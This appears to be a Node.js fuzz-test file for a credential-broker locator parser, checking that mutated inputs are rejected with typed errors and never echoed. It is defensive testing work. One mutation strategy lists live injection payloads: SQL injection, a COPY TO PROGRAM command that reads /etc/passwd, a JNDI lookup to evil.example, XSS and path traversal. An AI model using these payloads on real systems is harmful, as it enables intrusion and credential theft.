import test from "node:test";
import assert from "node:assert/strict";
import { mintLocator, parseLocator, isValidLocator, LocatorError } from "../../src/broker/locator.js";

/**
 * Deterministic PRNG so the 500-case fuzz corpus is reproducible across runs.
 */
function mulberry32(seed) {
  return function () {
    let t = (seed += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

const BASE64URL = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
const SPECIALS = "\"'`;--/*#$$\\\\{}[]()<>=&|%~^!:,.? \t\n\r\u0000\u2028\u2029\u00e9\u4e2d\u6587\ud83d\ude00";

const ALLOWED_ERROR_CODES = new Set(["EMPTY", "MALFORMED", "WRONG_VERSION"]);
const STRICT_V1_GRAMMAR = /^loc_v1_[A-Za-z0-9_-]{43}$/;

function randomCharFrom(rng, pool) {
  return pool[Math.floor(rng() * pool.length)];
}

/**
 * Mutation strategies. Each returns a fuzzed input (string or object form)
 * derived from a valid locator and the PRNG.
 */
const STRATEGIES = [
  // 1. Single/double char substitution with special characters
  (rng, base) => {
    const chars = [...base];
    const idx = Math.floor(rng() * chars.length);
    chars[idx] = randomCharFrom(rng, SPECIALS);
    return chars.join("");
  },
  // 2. Truncation at a random position
  (rng, base) => base.slice(0, Math.floor(rng() * base.length)),
  // 3. Random junk appended (short)
  (rng, base) => base + randomCharFrom(rng, BASE64URL + SPECIALS).repeat(1 + Math.floor(rng() * 3)),
  // 4. Wrong / missing / weird version tags
  (rng, base) => base.replace(/^loc_v1_/, [
    "loc_v2_", "loc_v0_", "loc_v", "loc_", "LOC_V1_", "loc_V1_",
    "loc_v1", "loc_v-1_", "loc_v99_", "loc_v1__",
  ][Math.floor(rng() * 10)]),
  // 5. Base64 padding / whitespace smuggling in the payload
  (rng, base) => {
    const payload = base.slice(7);
    const pad = ["=", "==", "===", " ", "\t", "\n", "\r\n"][Math.floor(rng() * 7)];
    return `loc_v1_${payload}${pad}`;
  },
  // 6. Classic injection payloads wrapped in locator clothing
  (rng, base) => {
    const payload = base.slice(7);
    const injection = [
      "' OR '1'='1", "'; DROP TABLE broker_credential_metadata;--",
      "1' UNION SELECT secret_locator FROM broker_credential_metadata--",
      "admin'--", "x'; COPY (SELECT '') TO PROGRAM 'cat /etc/passwd';--",
      "${jndi:ldap://evil.example/a}", "<script>alert(1)</script>",
      "../../etc/passwd", "%00", "%27%20OR%201%3D1--",
    ][Math.floor(rng() * 10)];
    return `loc_v1_${payload.slice(0, 20)}${injection}`;
  },
  // 7. Extreme length attacks
  (rng, base) => {
    const payload = base.slice(7);
    const lengths = [0, 1, 42, 44, 86, 500, 5000];
    const target = lengths[Math.floor(rng() * lengths.length)];
    return `loc_v1_${payload.repeat(Math.ceil(target / payload.length) || 1).slice(0, target)}`;
  },
  // 8. Unicode confusion and control characters
  (rng, base) => {
    const chars = [...base];
    const idx = 7 + Math.floor(rng() * Math.max(1, chars.length - 7));
    chars[idx] = ["\u202e", "\u200b", "\u0000", "\u0301", "\uff11", "\u2044"][Math.floor(rng() * 6)];
    return chars.join("");
  },
  // 9. Object-typed fuzzing (type confusion via the { id } object path)
  (rng, base) => {
    const payload = base.slice(7);
    const variants = [
      { id: null }, { id: 12345 }, { id: true }, { id: undefined },
      { id: `loc_v1_${payload.slice(0, 42)}` }, { id: {} }, { id: [] },
      {}, null,
    ];
    return variants[Math.floor(rng() * variants.length)];
  },
  // 10. Prefix / case / separator corruption
  (rng, base) => {
    const payload = base.slice(7);
    return [
      `loc_v1_${payload}`.toUpperCase(), ` LOC_v1_${payload}`, `loc_v1_${payload} `,
      `loc\n_v1_${payload}`, `loc_v1.${payload}`, `loc/v1/${payload}`,
      `loc_v1_${payload.split("").reverse().join("")}`,
    ][Math.floor(rng() * 7)];
  },
];

function buildFuzzCorpus(count) {
  const rng = mulberry32(0x57c0ffee);
  const base = mintLocator().id;
  const corpus = [];
  const seen = new Set();
  let guard = 0;
  while (corpus.length < count && guard < count * 20) {
    guard += 1;
    const strategy = STRATEGIES[guard % STRATEGIES.length];
    const input = strategy(rng, base);
    const key = typeof input === "object" ? JSON.stringify(input) : String(input);
    if (seen.has(key)) continue;
    seen.add(key);
    corpus.push(input);
  }
  return corpus;
}

const CORPUS = buildFuzzCorpus(500);

test("fuzz corpus has exactly 500 unique mutated locator inputs", () => {
  assert.equal(CORPUS.length, 500);
  const keys = new Set(
    CORPUS.map((input) => (typeof input === "object" ? JSON.stringify(input) : String(input)))
  );
  assert.equal(keys.size, 500, "corpus inputs must be unique");
});

test("500 mutated locators: parseLocator fails closed with allowlisted LocatorError codes only", () => {
  let rejected = 0;
  for (const input of CORPUS) {
    let result = null;
    let error = null;
    try {
      result = parseLocator(input);
    } catch (err) {
      error = err;
    }

    if (error) {
      // Graceful rejection: typed error, allowlisted code, no input echo.
      assert.ok(error instanceof LocatorError, `expected LocatorError, got ${error?.name}: ${error?.message}`);
      assert.ok(
        ALLOWED_ERROR_CODES.has(error.code),
        `unexpected error code ${error.code} for input ${JSON.stringify(String(input)).slice(0, 60)}`
      );
      assert.equal(typeof error.message, "string");
      rejected += 1;
    } else {
      // Any accepted input MUST exactly match the strict v1 grammar — no near-misses.
      const raw = typeof input === "object" ? String(input?.id ?? "") : String(input);
      assert.match(
        raw,
        STRICT_V1_GRAMMAR,
        `parser accepted a non-grammar input: ${JSON.stringify(raw).slice(0, 60)}`
      );
      assert.equal(result.version, "v1");
      assert.equal(typeof result.id, "string");
    }
  }
  // The corpus is adversarial; the overwhelming majority must be rejected.
  assert.ok(rejected >= 450, `expected most mutated locators to be rejected, got ${rejected}/500`);
});

test("500 mutated locators: isValidLocator never throws and agrees with parseLocator", () => {
  for (const input of CORPUS) {
    const valid = isValidLocator(input); // must not throw
    assert.equal(typeof valid, "boolean");
    let parseOk = true;
    try {
      parseLocator(input);
    } catch {
      parseOk = false;
    }
    assert.equal(valid, parseOk, "isValidLocator and parseLocator must agree");
  }
});

test("500 mutated locators: no input is echoed into error messages (no leak)", () => {
  for (const input of CORPUS) {
    try {
      parseLocator(input);
    } catch (err) {
      const message = String(err.message);
      // Only inputs long enough to carry a locator payload (>= 20 chars) are
      // meaningful leak vectors. Short prefixes like "loc_v" legitimately match
      // substrings of static messages (e.g. the 'loc_v<version>_' format hint),
      // which is documentation, not an echo of user input.
      if (typeof input === "string" && input.length >= 20 && input.length <= 60) {
        assert.ok(!message.includes(input), `error message echoed raw input: ${message}`);
      }
    }
  }
});

test("mintLocator output always satisfies the strict grammar the parser enforces", () => {
  for (let i = 0; i < 50; i += 1) {
    const minted = mintLocator();
    assert.match(minted.id, STRICT_V1_GRAMMAR);
    assert.doesNotThrow(() => parseLocator(minted));
    assert.doesNotThrow(() => parseLocator(minted.id));
    assert.equal(isValidLocator(minted), true);
    assert.equal(isValidLocator(minted.id), true);
    // toJSON round-trip stays valid (DTO serialization safety)
    assert.equal(isValidLocator(JSON.parse(JSON.stringify({ id: minted.toJSON() }))), true);
  }
});

test("repeated fuzzing of a minted locator never produces an unhandled crash", () => {
  const rng = mulberry32(0xdecafbad);
  const base = mintLocator().id;
  for (let i = 0; i < 500; i += 1) {
    const chars = [...base];
    const flips = 1 + Math.floor(rng() * 4);
    for (let f = 0; f < flips; f += 1) {
      const idx = Math.floor(rng() * chars.length);
      chars[idx] = randomCharFrom(rng, BASE64URL + SPECIALS);
    }
    const mutated = chars.join("");
    assert.doesNotThrow(() => isValidLocator(mutated));
    try {
      parseLocator(mutated);
    } catch (err) {
      assert.ok(err instanceof LocatorError);
    }
  }
});
